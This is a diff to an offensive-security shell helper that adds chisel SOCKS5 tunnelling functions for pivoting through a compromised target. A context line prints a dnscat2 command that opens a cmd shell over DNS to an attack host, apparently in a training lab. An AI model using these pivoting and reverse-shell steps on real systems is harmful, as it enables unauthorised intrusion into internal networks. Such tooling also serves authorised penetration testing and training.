@@ -31,8 +31,8 @@ Branching Out Tunnels
 ---------------------
 nb-pivot-dnscat2-server               create a encrypted channel session over dns protocol in txt records
 nb-pivot-dnscat2-client               command to establish a tunnel with to the running server on the attack host
-nb-pivot-chisel-server
-nb-pivot-chisel-client
+nb-pivot-chisel-server                socks5 tcp/udp tunneling via http protocol using ssh with chisel server
+nb-pivot-chisel-client                socks5 tcp/udp tunneling via http protocol using ssh with chisel client
 nb-pivot-icmp-server
 nb-pivot-icmp-client
 
@@ -46,7 +46,7 @@ DOC
 
 nb-pivot-install() {
     __info "Running $0..."
-    __pkgs sshfs rsync proxychains sshuttle python2.7
+    __pkgs sshfs rsync proxychains sshuttle python2.7 go
 }
 
 nb-pivot-mount-remote-sshfs() { 
@@ -161,6 +161,7 @@ nb-pivot-dnscat2-client() {
 
     if [[ $dn == "n" ]]; then
       __err "Transfer 'dnscat2.ps1' to target before proceeding."
+      __info 'nb-srv-scp-up'
       exit 1
     fi
 
@@ -172,4 +173,34 @@ nb-pivot-dnscat2-client() {
     __ok "Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret $key -Exec cmd"
     echo
     __info "You can drop into a shell using 'window -i 1'"
+}
+
+nb-pivot-chisel-server() {
+    nb-vars-set-lport
+
+    __ask "Did you transfer the 'chisel' to the target? (y/n)"
+    local tr && __askvar tr "ANSWER"
+
+    if [[ $tr == "n" ]]; then
+      __err "Transfer 'chisel' to target before proceeding."
+      __info 'nb-srv-scp-up'
+      exit 1
+    fi
+
+    __info "Run the following commands on the target  to spawn a server:"
+    __ok "./chisel server -v -p ${__LPORT} --socks5"
+}
+
+
+nb-pivot-chisel-client() {
+    nb-vars-set-rhost
+    __ask "Use the same port you used with chisel server"
+    nb-vars-set-lport
+
+    __info "On attack host connect to the chisel server:"
+    print -z "chisel client -v ${__RHOST}:${__LPORT} socks"
+    echo
+    __info "Add the proxy on port 1080 to proxychains4.conf using command:"
+    __ok "echo 'socks5 	127.0.0.1 1080' | sudo tee -a /etc/proxychains4.conf"
+    __info "You can now use proxychains with e.g. nmap"
 }
